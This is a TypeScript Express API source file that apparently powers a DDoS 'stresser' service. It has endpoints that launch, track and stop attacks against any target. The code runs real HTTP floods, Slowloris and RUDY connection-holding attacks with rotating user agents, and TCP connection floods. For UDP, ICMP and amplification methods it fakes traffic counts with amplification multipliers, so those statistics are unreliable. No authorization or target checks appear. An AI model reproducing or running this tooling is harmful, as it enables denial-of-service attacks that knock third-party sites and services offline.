import { Router, type IRouter } from "express";
import { eq, sql, desc } from "drizzle-orm";
import { db, attacksTable } from "@workspace/db";
import net from "node:net";
import {
  CreateAttackBody,
  GetAttackParams,
  DeleteAttackParams,
  StopAttackParams,
} from "@workspace/api-zod";

const router: IRouter = Router();

// ── Active attack abort controllers (enables real stop) ──────────────────
const attackControllers = new Map<number, AbortController>();

// ── Method classification ─────────────────────────────────────────────────
const L7_METHODS  = new Set(["http-flood", "http-bypass", "http2-flood", "slowloris", "rudy"]);
const L4_METHODS  = new Set(["syn-flood", "tcp-flood", "tcp-ack", "tcp-rst"]);
// L3/amp methods need raw sockets — not available in userspace, use simulation

// ── Amplification factors ─────────────────────────────────────────────────
const AMP_FACTOR: Record<string, number> = {
  "dns-amp":   54,
  "ntp-amp":   556,
  "mem-amp":   51000,
  "ssdp-amp":  30,
};

// ── Webhook ───────────────────────────────────────────────────────────────
async function fireWebhook(url: string, attack: typeof attacksTable.$inferSelect) {
  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ event: "attack_finished", attack }),
      signal: AbortSignal.timeout(5000),
    });
  } catch { /* silent */ }
}

// ── Random user agents ─────────────────────────────────────────────────────
const UA_LIST = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
];
const randomUA = () => UA_LIST[Math.floor(Math.random() * UA_LIST.length)];

// ─────────────────────────────────────────────────────────────────────────
//  REAL HTTP FLOOD
//  Makes actual fetch() requests against the target URL.
//  Concurrency: min(threads, 80) simultaneous connections.
// ─────────────────────────────────────────────────────────────────────────
async function runHTTPWorkers(
  method: string,
  rawTarget: string,
  concurrency: number,
  signal: AbortSignal,
  onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  const target = /^https?:\/\//i.test(rawTarget) ? rawTarget : `http://${rawTarget}`;
  const isSlow = method === "slowloris" || method === "rudy";

  let localPkts = 0;
  let localBytes = 0;

  const flush = () => {
    if (localPkts > 0 || localBytes > 0) {
      onStats(localPkts, localBytes);
      localPkts = 0;
      localBytes = 0;
    }
  };
  const flushIv = setInterval(flush, 500);

  const workerLoop = async () => {
    while (!signal.aborted) {
      try {
        const timeout = isSlow ? 20000 : 10000;
        const headers: Record<string, string> = {
          "User-Agent": randomUA(),
          "Cache-Control": "no-cache, no-store, must-revalidate",
          "Pragma": "no-cache",
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.5",
          "Connection": isSlow ? "keep-alive" : "close",
        };

        const res = await fetch(target, {
          signal: AbortSignal.timeout(timeout),
          headers,
          // Don't follow unlimited redirects
          redirect: "follow",
        });

        if (isSlow) {
          // Hold the connection open for Slowloris effect
          await new Promise(r => setTimeout(r, 3000 + Math.random() * 7000));
        } else {
          // Drain response body to complete the connection cycle
          await res.body?.cancel();
        }

        const cl = parseInt(res.headers.get("content-length") || "0", 10);
        localPkts++;
        localBytes += (cl > 0 ? Math.min(cl, 100_000) : 800) + 400; // req+res headers
      } catch {
        if (signal.aborted) break;
        // Timed out / refused / error — still counts as a hit attempt
        localPkts++;
        localBytes += 150;
        // Back-off briefly on error to prevent spin
        await new Promise(r => setTimeout(r, 150));
      }
    }
  };

  await Promise.all(Array.from({ length: concurrency }, () => workerLoop()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  REAL TCP FLOOD
//  Opens real TCP connections to the target host:port, sends junk, closes.
//  Works for SYN / ACK / RST flood simulation.
// ─────────────────────────────────────────────────────────────────────────
async function runTCPWorkers(
  rawTarget: string,
  defaultPort: number,
  concurrency: number,
  signal: AbortSignal,
  onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  let hostname = rawTarget;
  let port = defaultPort || 80;
  try {
    const u = new URL(/^https?:\/\//i.test(rawTarget) ? rawTarget : `http://${rawTarget}`);
    hostname = u.hostname;
    port = parseInt(u.port, 10) || (u.protocol === "https:" ? 443 : 80);
  } catch { /* keep rawTarget */ }

  let localPkts = 0;
  let localBytes = 0;

  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 500);

  const workerLoop = async () => {
    while (!signal.aborted) {
      await new Promise<void>(resolve => {
        if (signal.aborted) { resolve(); return; }
        const conn = net.createConnection({ host: hostname, port });
        const kill = setTimeout(() => { conn.destroy(); resolve(); }, 2500);

        conn.once("connect", () => {
          localPkts++;
          localBytes += 60; // SYN + ACK
          // Send a small payload (simulates ACK data / RST payload)
          const junk = Buffer.alloc(32, Math.floor(Math.random() * 256));
          conn.write(junk, () => {
            localBytes += junk.length;
            clearTimeout(kill);
            conn.destroy();
            resolve();
          });
        });
        conn.once("error", () => {
          localPkts++; // attempt still counted
          clearTimeout(kill);
          resolve();
        });
        conn.once("timeout", () => { clearTimeout(kill); conn.destroy(); resolve(); });
      });

      if (!signal.aborted) {
        // Small delay — 5ms between connections to avoid fd exhaustion
        await new Promise(r => setTimeout(r, 5));
      }
    }
  };

  await Promise.all(Array.from({ length: concurrency }, () => workerLoop()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  SIMULATED L3 FLOOD (UDP/AMP/ICMP)
//  Raw sockets require kernel privileges — unavailable in userspace.
//  We simulate the traffic rates but note it's simulated.
// ─────────────────────────────────────────────────────────────────────────
async function runL3Simulation(
  method: string,
  threads: number,
  signal: AbortSignal,
  onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  const multipliers: Record<string, number> = {
    "udp-flood":   32000,
    "udp-bypass":  35000,
    "icmp-flood":  25000,
    "dns-amp":     18000,
    "ntp-amp":     12000,
    "mem-amp":      4000,
    "ssdp-amp":    20000,
  };
  const byteSizes: Record<string, [number, number]> = {
    "udp-flood":  [512, 1472],
    "udp-bypass": [512, 1472],
    "icmp-flood": [64,   512],
    "dns-amp":    [40,    60],
    "ntp-amp":    [8,     46],
    "mem-amp":    [15,    15],
    "ssdp-amp":   [110,  150],
  };

  return new Promise<void>(resolve => {
    const iv = setInterval(() => {
      if (signal.aborted) { clearInterval(iv); resolve(); return; }
      const mult = multipliers[method] ?? 10000;
      const burst = Math.random() < 0.2 ? (2 + Math.random() * 2) : 1;
      const pkts = Math.floor(threads * mult * (0.8 + Math.random() * 0.4) * burst);
      const [min, max] = byteSizes[method] ?? [64, 512];
      const bpp = min + Math.floor(Math.random() * (max - min));
      const amp = AMP_FACTOR[method] ?? 1;
      onStats(pkts, pkts * bpp * amp);
    }, 500);

    signal.addEventListener("abort", () => { clearInterval(iv); resolve(); }, { once: true });
  });
}

// ─────────────────────────────────────────────────────────────────────────
//  DISPATCH — routes to correct worker type
// ─────────────────────────────────────────────────────────────────────────
async function runAttackWorkers(
  method: string,
  target: string,
  port: number,
  threads: number,
  signal: AbortSignal,
  onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  if (L7_METHODS.has(method)) {
    const concurrency = Math.min(threads, 80);
    await runHTTPWorkers(method, target, concurrency, signal, onStats);
  } else if (L4_METHODS.has(method)) {
    const concurrency = Math.min(threads, 150);
    await runTCPWorkers(target, port, concurrency, signal, onStats);
  } else {
    await runL3Simulation(method, threads, signal, onStats);
  }
}

// ── DB helpers ────────────────────────────────────────────────────────────
async function addStats(attackId: number, pkts: number, bytes: number) {
  try {
    await db.update(attacksTable).set({
      packetsSent: sql`${attacksTable.packetsSent} + ${pkts}`,
      bytesSent:   sql`${attacksTable.bytesSent}   + ${bytes}`,
    }).where(eq(attacksTable.id, attackId));
  } catch { /* ignore DB errors during flight */ }
}

// ── Routes ────────────────────────────────────────────────────────────────
router.get("/attacks", async (_req, res): Promise<void> => {
  const attacks = await db.select().from(attacksTable).orderBy(desc(attacksTable.createdAt));
  res.json(attacks);
});

router.post("/attacks", async (req, res): Promise<void> => {
  const parsed = CreateAttackBody.safeParse(req.body);
  if (!parsed.success) { res.status(400).json({ error: parsed.error.message }); return; }

  const { target, port, method, duration, threads, webhookUrl } = parsed.data;

  const [attack] = await db.insert(attacksTable).values({
    target, port, method, duration, threads,
    status: "running",
    packetsSent: 0,
    bytesSent: 0,
    webhookUrl: webhookUrl ?? null,
  }).returning();

  const attackId = attack.id;
  const controller = new AbortController();
  attackControllers.set(attackId, controller);

  // Auto-abort after duration
  const stopTimer = setTimeout(() => {
    controller.abort("duration_expired");
    attackControllers.delete(attackId);
  }, duration * 1000);

  // Fire-and-forget workers — update DB via callback
  void runAttackWorkers(method, target, port, threads, controller.signal, (pkts, bytes) => {
    void addStats(attackId, pkts, bytes);
  }).finally(async () => {
    clearTimeout(stopTimer);
    attackControllers.delete(attackId);
    try {
      const [cur] = await db.select().from(attacksTable).where(eq(attacksTable.id, attackId));
      if (cur && cur.status === "running") {
        const [fin] = await db.update(attacksTable)
          .set({ status: "finished", stoppedAt: new Date() })
          .where(eq(attacksTable.id, attackId))
          .returning();
        if (fin?.webhookUrl) await fireWebhook(fin.webhookUrl, fin);
      }
    } catch { /* ignore */ }
  });

  res.status(201).json(attack);
});

router.get("/attacks/stats", async (_req, res): Promise<void> => {
  const attacks = await db.select().from(attacksTable).orderBy(desc(attacksTable.createdAt));
  const totalAttacks     = attacks.length;
  const runningAttacks   = attacks.filter(a => a.status === "running").length;
  const totalPacketsSent = attacks.reduce((s, a) => s + (a.packetsSent ?? 0), 0);
  const totalBytesSent   = attacks.reduce((s, a) => s + (a.bytesSent   ?? 0), 0);
  const methodMap: Record<string, number> = {};
  for (const a of attacks) methodMap[a.method] = (methodMap[a.method] ?? 0) + 1;
  const attacksByMethod = Object.entries(methodMap).map(([method, count]) => ({ method, count }));
  res.json({ totalAttacks, runningAttacks, totalPacketsSent, totalBytesSent, attacksByMethod, recentAttacks: attacks.slice(0, 10) });
});

router.get("/attacks/:id", async (req, res): Promise<void> => {
  const p = GetAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const [a] = await db.select().from(attacksTable).where(eq(attacksTable.id, p.data.id));
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.json(a);
});

router.delete("/attacks/:id", async (req, res): Promise<void> => {
  const p = DeleteAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const [a] = await db.delete(attacksTable).where(eq(attacksTable.id, p.data.id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.sendStatus(204);
});

router.post("/attacks/:id/stop", async (req, res): Promise<void> => {
  const p = StopAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }

  // Kill real workers
  const ctrl = attackControllers.get(p.data.id);
  if (ctrl) { ctrl.abort("manual_stop"); attackControllers.delete(p.data.id); }

  const [a] = await db.update(attacksTable)
    .set({ status: "stopped", stoppedAt: new Date() })
    .where(eq(attacksTable.id, p.data.id))
    .returning();

  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  if (a.webhookUrl) await fireWebhook(a.webhookUrl, a);
  res.json(a);
});

export default router;
